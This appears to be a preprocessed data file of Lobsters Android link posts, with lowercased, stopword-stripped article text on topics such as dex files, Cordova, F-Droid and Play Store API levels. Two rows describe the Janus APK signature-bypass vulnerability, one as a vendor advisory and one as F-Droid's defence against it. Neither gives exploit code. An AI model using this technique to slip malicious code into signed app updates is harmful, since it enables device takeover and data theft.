200,Lobsters,android,Android,bhgv/Inferno-OS_Android - an Android port of Inferno OS,https://github.com/bhgv/Inferno-OS_Android,bhgvinfernoosandroid android port inferno o,infernoosandroid change may get official source vitanuova working changed added jit compiler buit kind fpu possibility use build medium note dependency build window host run,infernoosandroid change infernoos tree replaced repo infernoosbhgv use git clone recursive http githubcombhgvinfernoosandroid need old infernoos tree may get android api based last official source vitanuova working gui compatibility main gui app wmawm load wmawm start source applawm applalib touch screen single touch nt know use multitouches inferno file filetree stored sdcardinferno folder permission network styx regular tcp connection permission changed gui bigger icon bigger key keyboard bigger caption window icon changed size display output android way little experimental still may changed future added added support png svg image may used place may used bit image example parameter bitmap tk control call possibility resize svg png image time loading tk bitmap new size imagepath svgorpng ttf font maybe supported internally using embedded libfreetype use specify subfonts font file command line format regular emu commang line restriction mostly graphic parameter jit restriction hardware jit compiler buit kind fpu devaudio devaudioctl device first mapped dev f bind b dev possibility reading devaudio read phone mic stereo raw wave without header compression ex cat devaudio sndraw writing devaudio output data written phone speaker stereo raw wave without header compression ex cat sndraw devaudio devaudioctl support next command writing load file file path inferno f load specified file nt start play load uri uri address stream play load specified network stream nt start play unload file unloads last loaded file free used resource unload uri unloads last loaded network stream free used resource play file play loaded file play uri play loaded uri stop file stop playing file stop uri stop playing network stream loop file loop uri loop playing file stream sound stream record output raw wave devaudio playing file network stream use separate buffer may work simultaneously ex echo load file devaudioctl echo play file devaudioctl echo load uri http devaudioctl echo play uri devaudioctl thanks somafmcom network radio provided demo net stream mouse button emulated using multitouch possibility use point select need finger tap somewhere finger couse click mouse button coordinate click coordinate first finger copypaste functionality working text yet inferno copy paste buffer separated android copypaste buffer actually way copypaste inferno android build medium note built window using linux easy build linux pair change go infernoos folder rewrite bldbat script linux style also forget configure linux tool modifying makeconfig script dependency android studio cmake plugin android studio ndk build window host cd infernoos bldbat successful building inferno libs infernoosandroidarmlib open project android studio build apk run install apk android copy inferno tree infernoos android path sdcardinferno run
201,Lobsters,android,Android,"Java project Hydra, a network framework",https://github.com/DataSecs/Hydra,java project hydra network framework,description client server wiki wiki simple chat application keyvalue store quantitative benefit raw netty raw netty code server setup hydra code server setup installing maven local maven dependency maven central release example client client example server server example javadoc hydradatasecsdejavadoc license license credit aadi bajpai,description hydra built upon netty supposed simplify process socket setup java netty allows high performance good maintainability program built upon come hydra hydra us builderpattern order make process socket setup even simpler hydra come handy packet system allows easily create packet send via session hydra creates furthermore ability create packet listener need simple annotation invoked hydra packet received convince taking look client server example wiki case would like indepth introduction hydra please take look wiki wiki take stepbystep setup server client furthermore wiki feature example usage like simple chat application keyvalue store quantitative benefit raw netty raw netty code server setup hydra code server setup installing install maven clonedownload repo install mvn u dmaventestskiptrue clean compile install maven local maven dependency dependency groupid dedatasecs groupid artifactid hydraall artifactid version version dependency maven central dependency groupid dedatasecs groupid artifactid hydraall artifactid version version dependency would like client server use hydraclient hydraserver instead hydraall artifact id nt use maven download release version include project way prefer example client hydraclient client new clientbuilder localhost new sampleprotocol workerthreads option channeloptiontcpnodelay true build easy understand example create client socket order make packet system work register created packet listener detailed information example see client example server hydraserver server new serverbuilder localhost new sampleprotocol bossthreads workerthreads option channeloptiontcpnodelay true build example create server socket order make packet system work register created packet listener detailed information example see server example javadoc javadoc always uptodate found hydradatasecsdejavadoc license licensed bsd license see license file detail credit special thanks go aadi bajpai creating awesome banner logo
202,Lobsters,android,Android,MVC vs MVP vs MVVM for mobile app development: Let's end the debate!,https://www.simform.com/mvc-mvp-mvvm-mobile-app-development/,mvc v mvp v mvvm mobile app development let end debate,mvc v mvp v mvvm io app development quick dirty way decide best use mvc building simpler application use mvp using xamarin crossapp development io use mvvm solve problem massive viewcontrollers use mvvm swift client project requires ship higher quality code fixed budget deadline protocol oriented programming pop swift implementing routing navigation mvvm route changed wiser move away routing navigation code view controller use mvvm project testdrivendevelopment conclusion,mvc v mvp v mvvm io app development quick dirty way decide bestyou need reinvent wheel come mobile app architectural design pattern listed use case directly pickup architectural design pattern directly list sure would find directtothepoint helpfuluse mvc building simpler applicationmany time new beginner tend learn mvvm along reactivecocoarxswift without realizing standard way program iosmvc recommended architectural pattern learn io development structure data flow interaction app starting want build simpler application good architectural pattern get hand dirtyhowever using mvc application complex view create problem massive view controller viewcontroller becomes bloated line codesthumb rule using mvc architecture building simpler io applicationsin mvc developer mostly real tendency put logic viewcontroller leaf end giant viewcontroller difficult managebut lately boil understanding pain point mvc attempt solve end day follow pattern like bible learn make viewcontrollers thin leanfollowing point following prevent viewcontroller getting bloated mvc refrain handling grunt work like uitableviewuicollectionview viewcontrollers assign complexity different class viewcontroller provide model object displayedbreak view controller multiple child controller force separation concern project working onuse mvp using xamarin crossapp development iosmost developer use mvvm leveraging xamarin io app development however kind approach limited apps simpler functionalitiesif app relative complex screen lot element implementing code mvvm make framework prone bug add significant risk project mvvm business logic contained viewmodel layerany change business logic require view layer immediately reflect mvvm use data binding purpose bind view state property unlike mvp usually creates big problem invisible outputsin mvvm property sure case exactly going trigger view update unless check implementation detail unneeded uncertainty view layer behaves using framework may many limitationsuse mvvm solve problem massive viewcontrollersif find viewcontrollers mvc heavily bloated complex app logic always make lean following thumb rule mentioned however still unable always move mvvm refactoring viewcontroller viewmodelviewcontrollers mvvm massive compared mvc moreover viewmodels mvvm often easier test make code manageable resultuse mvvm swift client project requires ship higher quality code fixed budget deadlinemost time client want deliver app fixed deadline budget using mvc mvp case wiser problem deal term massive viewcontrollers presentersmvvm along swift good architecture follow case simplifies problem massive view controller introducing viewmodel concept moreover swift better coding language objective c introduces lot modern concept help write clean code example support optional type often make deal easily lot nullsprotocol oriented programming pop swiftone considerable advantage adopting mvvm structure isolation business logic however reality difficult observe advantage due specific binding controller view model objectsby definition view model unit encapsulates domain logic needed controller henceforth view model reusable case controller share package functionality often rare app complexity growswe found popmvvm absolutely beneficial case solve problem viewmodels correspondence certain number different traitsfor instance might two different viewmodels interacting animal like dog cat habitual objectoriented programming would make different method contain specific logic feed play train etc however efficient considering animal feed played way simplified splitting interaction multiple trait feeding trait playing trait etc turn reduce number duplicated implementation viewmodels since trait contain logicimplementing routing navigation mvvmmvvm good job moving business logic vc viewcontrollers presentation logic routing navigation still stuck vc generally creates problem massive view controllershenceforth really important u move routing navigation view controllersin app consists login screen following list route implement login home screensign user sign screenforget passwordat first glance look easier implement however easy looksyou may implement login screen home screen case user password expiration require implementing forget password screen home screenhence case route changed login change password screen home screensign upnow want implement logic vctherefore wiser move away routing navigation code view controller one way introducing coordinator architecture make mvvmc major responsibility coordinator handle navigation flow appthe entire implementation code mvvmc viewed github hereuse mvvm project testdrivendevelopmenttestability one major prerequisite architectural pattern project relies heavily testdriven development important choose good architectural pattern mvc preferable architectural pattern come unit testing hence recommended use mvc case testdriven developmentas long know thin view controller mvvm appropriate architectural pattern testdrivendevelopment make overall code testable alongside productionconclusionto conclude short turn mvvm way ahead mvc mvp come io app development however end boil requirement appin general case mvc good architectural pattern develop smaller midsized application complex app scenario need know make view controller thin lean moving presentation logic
203,Lobsters,android,Android,The Dex File Format,https://blog.bugsnag.com/dex-and-d8/,dex file format,dalvik executable format dex file method size limit unexpected behaviour app dexing process android runtime performance improvement time create dex file minimal apk hexfiend unusual data type dex structure full structure interpreting dex file header file header dex file magic uniquely identify application used manipulate checksum checksum signature hash multidex file size header size endian constant reverseendianconstant id offset type size offset map list string jni type typedescriptor prototype method class defs bit field class data infamous method limit code structure following structure dalvik bytecode new android compiler new compiler benchmarking performance apk analyzer better faster smaller stronger metric dx minification lead better app proguard mapping obfuscated stacktraces instant app would like know get touch bugsnag android crash reporting,ever wondered happens android application code compiled packaged apk post take deep dive dalvik executable format practical example structure minimal dex filewhat dex file dex file contains code ultimately executed android runtime every apk single classesdex file reference class method used within app essentially activity object fragment used within codebase transformed byte within dex file run android appit useful understand structure dex file reference take lot space application using many party library increase apk size megabyte worse lead infamous method size limit course may come day knowledge dex file help track unexpected behaviour appdexing processall java source file android project first compiled class file consist bytecode instruction traditional java application instruction would executed jvm however android apps executed android runtime us incompatible opcodes therefore additional dexing step required class file converted single dex filebecause mobile device severely constrained amount memory processing power battery life available art offer superior performance jvm one key feature help achieve art performs aheadoftime justintime compilation avoids runtime overhead jit still allowing performance improvement time app profiledhow create dex filea practical example dex file make lot easier understand create minimal apk contains one application class allows u understand file format without overwhelmed thousand method present typical use hexfiend view dex file hexadecimal dex us unusual data type save space hidden null byte empty space screenshot actually represent dex structurethe full structure dex file shown hexadecimal section instantly recognisable interpreted single bugsnagapp class defined within source code others init landroidappapplication lcombugsnagdexexamplebugsnagapp v minapi version ã wdinterpreting dex file headerat high level dex file thought two separate part file header contains metadata body contains majority data diagram file header structure shown step item header sequentiallydex file magicmany file format begin fixed sequence byte uniquely identify application used manipulate dex see first byte must contain version number currently targetsdkversion api may also noticed byte encodes newline character byte null validated android framework check file corruption apk refuse install exact sequence next value checksum calculated applying function content entire file excluding byte preceding checksum byte within file corrupted download storage disk calculated checksum match android framework refuse install header also includes hash file excluding preceding byte used uniquely identify dex file may useful scenario multidexfile match file size byte also used validation reading dex fileheader header size byte longtherefore highlight remaining field within headeritemendian file support big endian little endian encoding value equal reverseendianconstant indicating particular dex file encoded little endian default behaviourids offsetsthe remaining value file header define size location data structure hold identifier method string value summarised table size equal array length offset number byte start file information foundtype size offsetlinksize na worth noting linksize fieldids app statically link library contain field mapoff structure data section largely duplicate information easier format dex file parsingas example see string id dex file encoded byte id position also point offset within data section encodes actual value stringmap listthe maplist section within data body contains similar information file headerwith knowledge use offset resolve actual information determine dex file encodesstringsenough talk see something concrete find stringids structure point array encodes integer offset point data init lcombugsnagdexexamplebugsnagapp minapi version retrieve value greeted java symbol look familiar anyone used jni also json indicates created dex file business id offset multiple header may seem bit useless point encode string value directly header reasoning behind string referenced multiple point within dex file providing id one prevents duplication information reduces overall file size simplifies parsing id always fixed length mean value accessed dex file defines java type value index previous stringid array therefore determine type file follows lcombugsnagdexexamplebugsnagapp typedescriptor syntax may look somewhat unfamiliar l simply refers full class name v type void type include custom bugsnagapp class application class android v va method prototype consists information return type method number parameter take protoid section us index retrieve type information offset nonfunctional case method take parametersmethodsthe method section also us index method look class id defined method prototype name method string v init lcombugsnagdexexamplebugsnagapp v init method dex file relate constructor bugsnagapp exactly expectclass defsthis section contains type inheritance hierarchy access metadata class metadata annotation source file ffffffff evaluates public class lcombugsnagdexexamplebugsnagapp inherits landroidappapplication whose class data stored byte public access modifier determined bit field view class dataclass datathe first byte bugsnagapp class data define number static instance field along direct virtual cc one direct method defined class id corresponds lcombugsnagdexexamplebugsnagapp v init code data offset method abstract native code data offsetif class defined field information data would encoded section incidentally method id value larger would encountered infamous method limitcode analysing constructor method defined class following structure offset corresponds register size incoming argument outgoing argument offset debug information storedthe important part however last byte instruction list size mean method compiled one opcode dalvik bytecode table suggests corresponds sgetbyte operation register using field reference index seems match expectation singleton bugsnagapp field created application diving deep dalvik story another day new android compiler touched much compilation process minimal dex file created using new compiler rolled default android studio offer performance benefit overall file size build speed test claimsbenchmarking create greenfield app android studio add kotlin support navigation drawer otherwise leave option default generate signed apk view apk retrieve classesdex within apk unzipping apk unzip appreleaseapk app measuring file size byte stat f z appclassesdexbetter faster smaller strongermetric dx file size mb count count method reference dex file approximately previous size compiling mileage may vary simple example project one interesting thing note using appear lost following two method reference androidviewview isineditmodejavalangclass desiredassertionstatusthese appear used runtime could optimisation please get touch know missing minification lead better appenabling minification obfuscation single greatest thing app expert dex format probably think reason whyfirstly stripping unused java class proguard reduce size apk generated dex file contain unused class definition associated data take spaceobfuscation also reduce dex file size unless type developer name class aaa zzz le character required symbol save space overall solution exist mapping obfuscated stacktraces allow easily diagnose crash within appfinally smaller dex file lead smaller apk mean user spend le mobile data le likely give download offer instant app hard limit mean keeping apk size low big considerationwould like know hopefully helped understand dex file get lot smaller advent question feedback please feel free get automatically monitor application harmful error alert giving visibility stability software think u mission control software qualitytry android crash reporting
204,Lobsters,android,Android,Third Replicant 6.0 release,https://blog.replicant.us/2017/12/third-replicant-6-0-release/,third replicant release,security issue remote keyboard wiki safe mode,new version replicant released week ago fix important issue make device end boot loop device crashing boot endlessly installing certain application also fix security issue enables attacker decrypt andor modify wifi traffic problematic security relying wifi encryption case using wifi connect device use application like remote keyboard telnet also problematic share internet connection wifi service phone operator use available without authentication updating new version strongly recommended see update instruction wiki device affected boot loop issue mentioned update instruction work expect able easily reboot recovery case reboot recovery first boot safe mode follow update instruction reboot recovery
205,Lobsters,android,Android,New Collaborations on Exposing Tracking,https://f-droid.org/en/2017/12/14/new-collaborations-on-exposing-tracking.html,new collaboration exposing tracking,antifeatures exodus privacy yale privacy lab various form tracking,since fdroid community working provide verified free software make apparent form tracking advertising commonly found apps fdroid provides complete app ecosystem user actively notified tracking advertising apps make informed choice achieved work many dedicated volunteer reviewing apps submitted marking thing find researcher exodus privacy yale privacy lab working taking next big step creating tool automating process finding various form tracking apps include fdroid work merge effort increasing effectiveness volunteer exposing inner working software daily use worldwide fdroid represents trustworthy method getting apps libre gratis alternative model driven advertising revenue data collection fdroid make custom build free software like firefox telegram removing code limit freedom user often remove thirdparty sdks software development kit enable tracking denying user apps choice pragmatic us tracking usability testing crash reporting release management even information collected fashion often represents unique data profile user may expose private detail especially true information correlated rich data set software industry giant billion user around globe running mobile platform based upon free software android many mobile device primary gateway internet device often collecting transmitting intimate detail user behavior location complex hidden method international free software community must continue leader protecting restoring trust privacy security mobile computing
206,Lobsters,android,Android,"Introducing Haven, the open source security system in your pocket",https://freedom.press/news/introducing-haven-open-source-security-system-your-pocket/,introducing open source security system pocket,new android app called edward snowden video snowden interview wired andy greenberg would love help making better github page set donate page google play fdroid,video today proud announce release new android app called open source security system journalist human right defendershaven personal security system empowers individual use cheap second phone running free opensource software monitor possession physical space away joint project guardian project freedom press foundation fpf imagine journalist working hostile foreign country worried security service breaking hotel room rifling belonging computer away detects change environment using sensor typical camera microphone gyroscope accelerometer ambient light usb alert anyone enters space attempt tamper device therethe app send endtoend encrypted alert phone via signal monitor activity remotely tor onion service importantly rely cloud transmit data third party access unless sm functionality turned situation data wififreedom press foundation board president edward snowden leading project fpf side explains exactly work video also read project snowden interview wired andy greenberg also free open source software right still beta would love help making better looking tester developer designer partner build community make beplease visit github page information contribute freedom press foundation set donate page support guardian project development project well guardian project developer created app shoestring budget proceeds go furthering amazing workyou download app google play fdroid
207,Lobsters,android,Android,Google fights fragmentation: New Android features to be forced on apps in 2018,https://arstechnica.com/gadgets/2017/12/google-fights-fragmentation-new-android-features-to-be-forced-on-apps-in-2018/,google fight fragmentation new android feature forced apps,enlarge tried restrict currently rethinking google announced api level android changed way background task api level android le background processing stricter permission controllable notification adaptive icon speeding ecosystem adoption late security benefit faster api deprecation time million downloads minimum api level google play service,enlarge google play developer console stop accepting old apps apple app store heavily regulated google play store mostly lived life google laissezfaire attitude long nt get caught google malware scanning app free anything lately google handsoff approach seems changing company tried restrict android powerful accessibility apis accessibility apps power user revolt google currently rethinking plan play store biggest change coming though recently google announced start setting minimum api level new updated apps required use basically google stop accepting old app code developer move wo nt harm support device running old version android require developer adopt new android feature restriction come every new version android come new api level change app framework function adding new feature new restriction new security measure currently developer opt change using old api level soon forced target recent api level accelerate google android change throughout app ecosystem rather wait year year happen naturally android incredibly ineffective o update program android apps must set two api level internally first minimum api level determines oldest android version app run target api level highest version android app aware every new version android bump api level one version currently android api level google change way android app framework work nt want break old apps lock functionality behind new target api level instance api level android google changed way background task worked turning many powerhogging background processing feature apps requiring use restrictive api api level android google added à la carte permission allowing user block apps accessing certain device function change good user restrictive app developer require work implement developer wanted greedy device hog could decide target latest api level restriction would apply ability use older api level meant backwardcompatibility consideration developer abuse feature greedy lazy malicious previously google used carrot approach getting developer target latest api level want access sweet new fingerprint api android vulkan graphic api need target latest version newer version also come host requirement restriction make app better smartphone citizen though new api level nt much way enticing developer feature mostly thing good user like le background processing stricter permission controllable notification design conformancy feature like adaptive icon work developer implement benefit user nt help developer carrot approach look like going away replaced stick google say update newer api never update app speeding ecosystem adoption api survey percent apps would meet google new update requirement google published timeline mandatory api level adoption generally api level year old become mandatory new updated apps begin august targeting api level android released august mandatory new apps month later requirement kick app update requiring new updated apps use api level year old speed api adoption across android app ecosystem last took survey top nongame apps late actually know natural api adoption speed look like shortly release android lengthy developer preview period five percent top apps targeted latest api version percent targeted previous api level seven month old time survey look top apps target api level year old newer new minimum requirement percent assume top apps regularly updated google new requirement would bump percent keep mind top apps made competent developer guess represent best android offer billion apps probably le wellmaintained today notable exception top facebook still target marshmallow api level two year old allows company dodge android new background processing requirement meaning facebook app run background time want snapchat us api level almost three year old allows company skip android à la carte permission mean install app approve ghastly brick permission giving snapchat identity contact location photo microphone access device id would company want upgrade give access security benefit faster api deprecation setting minimum floor api level help security written time google malware scanning nt perfect sometimes malicious apps end play store sometimes even get million downloads going write malicious app aimed defeat google builtin malware scanning certainly would nt target newest api level use older version fewer restriction app allowing wreak havoc steal information malware writer limited apis year old trick user installing app play store perhaps best news blog post future android version also restrict apps nt target recent api level adversely impact performance security hopefully mean google going actually retire api level faster allowing android become streamlined letting apps pick api level mean maintaining ton old system old apps plug sometimes new system come along replaces old one google still keep old system around case old app want use google requires new updated apps use later api possible google could opt streamline newer version android remove old component today google cutoff point seems api level minimum api level google play service api level corresponds android ice cream sandwich six year old android oreo still contains component needed make sixyearold apps work one thing nt happening purge old apps play store late developer wo nt able update old apps without fixing api level apps still free rot play store forever change also wo nt affect developer ability make apps older device require support new o feature one year release august long way away probably purpose google giving developer plenty notice nt room excuse restriction kick
208,Lobsters,android,Android,F-Droid and the Janus Vulnerability,https://f-droid.org/en/2017/12/13/fdroid-and-janus.html,fdroid janus vulnerability,janus vulnerability janus demo apk explicit block,janus vulnerability sprung forth unto android world sprung action keep far away first fdroidorg guardianprojectinfofdroid aptizzysoftdefdroid scanned possible janus exploit none found greatest protection malware requirement everything must built source human review apps added source tarball build stored forever exploit writer want give away source code malware activity permanently logged git process keep away malware found fdroidorg year operation fdroid also open ecosystem mean many people getting apps source reason working add janus detection fdroid android client app apk janus exploit found prompt user uninstall tab apk janus exploit downloaded repo allowed blocked installed also random good news turn none janus example pas fdroid update failed verify fdroid update call aapt dump badging one file passed test publicly released janus demo apk strange date like zip entry probably trick needed assemble dexzip file triggered crash fdroid update parsing date androidmanifestxml python complains month crash prevents apk added repo also added explicit block apks trying exploit janus also apksigner better verifying apk signature many janus example failed apksigner installed fdroid build us apk signed apk signature thing like janus exploit possible working apks built source sure install apksigner safely say would difficult inadvertently put janus exploit fdroid repo new protection android client app repo force user install one
209,Lobsters,android,Android,Android exploit allows app modification without affecting signatures,https://www.guardsquare.com/en/blog/new-android-vulnerability-allows-attackers-modify-apps-without-affecting-their-signatures,android exploit allows app modification without affecting signature,janus vulnerability apk file dex file threat scope mitigation dexguard disclosure resolution android security bulletin,serious vulnerability android allows attacker modify code application without affecting signature root problem file valid apk file valid dex file time named janus vulnerability roman god dualityjanus vulnerability janus vulnerability stem possibility add extra byte apk file dex file one hand apk file zip archive contain arbitrary byte start zip entry actually generally zip entry jar signature scheme take account zip entry ignores extra byte computing verifying application signature hand dex file contain arbitrary byte end regular section string class method definition etc file therefore valid apk file valid dex file time another key element seemingly harmless feature dalvikart virtual machine theory android runtime load apk file extract dex file run code practice virtual machine load execute apk file dex file get apk file still look magic byte header decide type file find dex header load file dex file otherwise load file apk file containing zip entry dex file thus misinterpret dual dexapk filesan attacker leverage duality prepend malicious dex file apk file without affecting signature android runtime accepts apk file valid update legitimate earlier version app however dalvik vm load code injected dex filethreats although android application selfsigned signature verification important updating android application user downloads update application android runtime compare signature signature original version signature match android runtime proceeds install update updated application inherits permission original application attacker therefore use janus vulnerability mislead update process get unverified code powerful permission installed device unsuspecting usersone imagine severe scenario attacker replace trusted application high privilege system app instance modified update abuse permission depending targeted application could enable hacker access sensitive information stored device even take device completely alternatively attacker pas modified clone sensitive application legitimate update instance context banking communication cloned application look behave like original application inject malicious behaviorthe zip file format archaic prone problem like master key vulnerability janus vulnerability ambiguous zip file likely give rise similar vulnerability different context different system root cause redundancy format designing data format protocol data structure code general one always strive avoid redundancy discrepancy lead bug worsescope mitigation created simple internal tool create janus application proof concept time seen application wildany scenario still requires user install malicious update source outside google play store may relatively easy trick user application still look exactly like original application proper signature expert common reverse engineering tool show injected code user always vigilant downloading application updatesthe janus vulnerability affect recent android device android newer application signed apk signature scheme running device supporting latest signature scheme android newer protected vulnerability unlike scheme scheme considers byte apk file older version application newer application running older device remain susceptible developer least always apply signature scheme application using dexguard tamper detection mechanism better hardened cloning attack mechanism performs additional check make sure protected application modified way recommend use tamper detection dexguard layer protection reverse engineering cloningdisclosure resolution reported issue google july received acknowledgment day google released patch partner november published bug android security bulletin december
210,Lobsters,android,Android,Lessons learned from 4 years of using Cordova in production,http://korban.net/posts/2017-11-29-lessons-4-years-of-cordova/,lesson learned year using cordova production,leaky abstraction limited capability nonnative ui impossible track gps background io recommendation,spent four year developing application io android ended relying cordova plugins developed long list capability showing map complex overlay even web gl map latest version readingwriting local file using camera photo qr code scanning working background continuously tracking user position including long stretch time background using accelerometer detect motion stopstart event tracking bluetooth beacon ranged continuously background local notification push notification uploading image working offline usual interaction server sync data think pushed boundary possible develop cordova really appreciate cordova viable option former business develop application could run two different platform additionally share code another web application realistically lot drawback well leaky abstraction cordova much leaky abstraction way forget platform specific develop single glorious javascript codebase fully escape native code ended modifying native code plugins achieve desired behaviour implement fix thing required hunting additional platform specific plugins example get application run background android add extra plugin would allow configure appropriate wake lock time time find install tiny single purpose plugins eg fix android build error caused missing translation prescribed default configuration add new setting required use camera particular version io cordova seems small number contributor although appear quite dedicated thing generally lag behind o release plugins likely updated o bug tool bug plugins lot thing generally feel slapped together unpolished bug stay open long time particularly plugins couple issue highlight point cordova screwed version code android appending zero causing quite headache developer version number started approaching upper bound range cordova fixed version number increase monotonically point view play store add extra build step append zero version code build process issue plugins request permission o one plugin requesting particular permission either going cause build fail one request win based unknown order randomly ordered request win still problem user prompt message associated request io since wanted prompt particular text add extra build step set later build process limited capability cordova limited lowest common denominator multiple platform abstraction top native apis try complex stuff inevitably run various limitation bug example lot problem developer tool io working started integrate mapbox web gl map application time go web view becoming risk io apple released wkwebview replacement uiwebview io wkwebview provides much improved performance used cordova apps however come number caveat critically run javascript app background worked uiwebview also requires server cors enabled app make asynchronous request served via file limitation largely imposed apple implementation clear either whether going resolved long uiwebview continue exist oddity like weird error trying read local file inconsistent reporting connection status example android device connected wifi guest mode power status battery level retrieved demand would reported upon change meant dark device happened hooked ac power charged battery event would generated case nonnative ui started project hardly viable option crossplatform mobile development initially started working platform called steroid promised provide element native ui eg transition navigation bar combination cordova rest however quickly realised getting mired leaky abstraction hell combination complicated framework steroid top another framework cordova lethal difficult isolate bug made decision migrate plain cordova luckily straightforward point day multiple option crossplatform mobile development native ui react native xamarin nativescript probably manage avoid issue specific running app web view still lot caveat cordova impossible track gps background io long time spent trying find solution conclude simply way reliably track gps location background io extended period time something appears changed internally starting io possibly even io cause device work without fault week developer device always subset course others app get either suspended terminated sooner later difficult issue diagnose course suspended app log anything scoured internet solution week last couple year tried popular cordovaplugingeolocation forked incorporated suggestion could find running background spent considerable amount time trying get commercial transistorsoft plugin work end conclude simply possible io android possible long set wake lock properly fair sure even native app io could achieve recommendation good idea use cordova additional layer abstraction provides gain speed development would suggest good rule thumb assume risk due exposure bug limitation complexity rise square number layer involved cordova time much writing native application something like ionic time much native cordova ionic recommendation use cordova simple apps much sensor nothing little background need create something fairly complex something native look feel better biting bullet developing native application also recommend going higher two layer framework simply brittle bugprone something like ionic completely limit
211,Lobsters,android,Android,Living with an open-source phone,https://nolanlawson.com/2017/11/27/living-with-an-open-source-phone/,living opensource phone,choosing android rom lineageos paranoid android copperheados aosp building aosp source fast security update twrp clockworkmod vendor binary choosing phone installing rom htc dream htc magic nexus pixel nexus samsung galaxy heimdall getting apps fdroid catlog keepscore fdroidorg yalp store messaging signal nt available fdroid download directly signal website update example firebase cloud messaging web browser ffupdater duckduckgo ublock origin auto updater chromium map osmand update support turnbyturn navigation mapsgooglecom onebusaway weather extra page openweathermap forecast widget national weather service keyboard anysoftkeyboard update support searching emoji music podcasting adbsync vanilla music antennapod social medium stopped using twitter mobile website mastodon tusky ridesharing ridelyftcom lyftcom email calendar contact fastmail mail caldav carddav davdroid app password server name port password twofactor auth joel spolsky method passwordgorilla passwdsafe freeotp web work everyone barcode scanner note widget hnpremiicom newsblur opensource client app firefox send outlookofficecom gstrings paul lewis guitar tuning webapp conclusion actually fill kind despair security privacy far assured,month ago decided make radical change smartphone lifestyle wanted phone would limit amount personal data broadcasting third party namely apple google decided run moreorless vanilla version android without google play service ie google map gmail google play google search apps living setup month surprise really bad feel like return stone age feel like sacrificed nicety smartphone point carrying around glorified flip phone however bit nonobvious get stuff work especially get android phone google play store post like talk bit smartphone setup hope might help someone looking make similar switch choosing android rom various flavor android choose lineageos spiritual successor cyanogenmod paranoid android copperheados even build aosp android open source project source fumbling around building aosp source much difficult thought lot requirement build environment cpu horsepower storage also tried lineageos copperheados eventually settled lineageos lineageos well mostly easy offered fast security update like minimalist interface builtin apps lineageos also familiar previously used cyanogen many year forgot much enjoyed small creature comfort longpressing volume updown key skip track default homescreen lineageos also needed recovery image order install rom seems twrp become defacto standard day replacing venerated clockworkmod turn none option result opensource phone still running vendor binary particular phone close get smartphone run freelibre opensource software choosing phone installing rom going guide unlocking rooting android phone process different every phone would take long describe various step suffice say still painful process choice phone either make easier harder rooting unlocking tinkering android phone long time since day htc dream htc magic around since worked android mobile web developer become comfortable tool like android sdk adb fastboot android studio yet day still find installing custom rom frustrating timeconsuming experience wish easier casual folk stuff nexus line phone pixel always easiest customize many year stuck triedandtrue nexus still surprisingly capable phone despite released swear ran faster also kicked bucket year two use however aging nexus cut mustard anymore due hardware issue usb port loose become tricky charge decided buy new phone instead settled samsung galaxy mostly could get cheap amazon full support carrier tmobile retrospect choosing nonnexus device made life lot harder several hour research unlocking samsung phone including building heimdall source window machine prebuilt binary date software old build mac finally lineageos phone running second thing want ensure device encrypted enable security setting unfortunately ended making phone unable start o booting recovery factory reset encryption o running fine lineageos home screen getting apps without google play store use fdroid added benefit hosting free opensource apps fact couple apps previously catlog keepscore far tell built directly source sure removed possibly stopped maintaining get fdroid download directly fdroidorg also allow installation unknown source security setting odd app nt available fdroid also use yalp store either use google account ephemeral account download apps play store clear whether violates google play term service though proceed caution messaging use signal default sm app messaging family friend unfortunately nt available fdroid download directly signal website use yalp store technique update wondering verify fingerprint apk downloaded signal website example like android apps signal normally us firebase cloud messaging fcm formerly gcm send push notification nt google play service installed signal offer switch le batteryefficient background polling mechanism used mechanism month occasional problem large backlog old message suddenly delivered also nt visible impact battery life usually end day half charge left great battery web browser web browser mainly use firefox via ffupdater tool clunky get job done set duckduckgo default search engine ublock origin installed addon undoubtedly make browsing faster easier battery occasionally though find site run mobile firefox use auto updater chromium automatically installs chromium update bit nicer ffupdater work silently background rather requiring manually check update builtin browser support add homescreen find fairly useless map use osmand nice allows download map advance offline use unfortunately still nowhere near featurecomplete google map looking something help navigate car may luck update actually osmand support turnbyturn navigation also frequently use mapsgooglecom firefox work surprisingly well besides minor performance issue fairly indistinguishable native app basic direction bus timetable store lookup google map running firefox living seattle one favorite apps also onebusaway provides uptodate arrival time seattle bus unfortunately app requires google play service order work without weather speaking seattle also important know much going rain given day spoiler alert lot happens one thing lineageos bit nonintuitive get weather work go extra page download weather provider case using openweathermap unfortunately though even installing weather provider get builtin clock widget show weather keep saying network geolocation disabled even though ended installing forecast widget get data national weather service rather builtin weather provider maybe bug installation hardware case satisfied workaround forecast widget look work fine weather time widget homescreen keyboard nonstandard feature really want keyboard emoji support swipe input unfortunately find opensource keyboard thing aosp keyboard seem support either closest found anysoftkeyboard least emoji screen allow search emoji though bit frustrating sending emoji via anysoftkeyboard signal overall keyboard experience least favorite part lineageos experience realize much become accustomed swipe input revert back tapping feel like huntandpeck input extremely laborious slow although plus side spending le time texting maybe good thing update actually anysoftkeyboard support searching emoji need type search term music podcasting fairly oldschool music consumer prefer listen album start finish never really got service like pandora spotify instead buy amazon old habit entire library sync desktop computer phone using adbsync browsing listening music library found vanilla music fantastic cover art downloader interface minimal clean play album start finish really ask vanilla music album oh course vanilla music set cover art lock screen little thing count also something podcast addict use antennapod download listen podcasts tried several podcast apps fdroid found one easiest reliable overall particularly like allows search itunes since podcasts hard find elsewhere social medium stopped using twitter absolutely must mobile website bad either firefox chromium told facebook mobile website also pretty functional spend social medium time day mastodon turn mobile website work perfectly fine firefox chrome pin homescreen also tusky prefer native app experience ridesharing use uber lyft mobile webapp work well native app need ride open ridelyftcom firefox pwa far tell work well native android app somewhat bafflingly though go lyftcom directly site may try route driver portal app store instead lyft website may offer lyft firefox pwa case get confused may need look lyft firefox link seems like bizarre way saying lyft web lyft email calendar contact switched fastmail recently primary email account really happy service fast simple clear business model pay buck month host email simple get email phone use mail found bit reliable featurerich builtin email app prefer simpler interface though builtin app work fine fastmail also support calendar contact sync get bit trickier ever connected email client email server manually typing imap smtp setting incidentally email feel pretty familiar fastmail support caldav carddav hook phone used davdroid honestly probably tedious process setting lineageos phone involved creating app password client use separate password email calendar contact interest security manually typing server name port various fastmail endpoint long errorprone process end full email calendar contact sync complain password twofactor auth nearly decade stored password using joel spolsky method use passwordgorilla desktop passwdsafe android like method simple work crossplatform maintain control password file twofactor authentication basic sm freeotp essentially take place google authenticator web work everyone one main reason switching nongoogle android phone see capable web application delivery system aside native apps listed minor utility eg barcode scanner note widget pretty much everything web browser medium source like hacker news ar technica others need app pin website home screen although hacker news use excellent hnpremiicom main exception newsblur access via opensource client app video youtube vimeo also 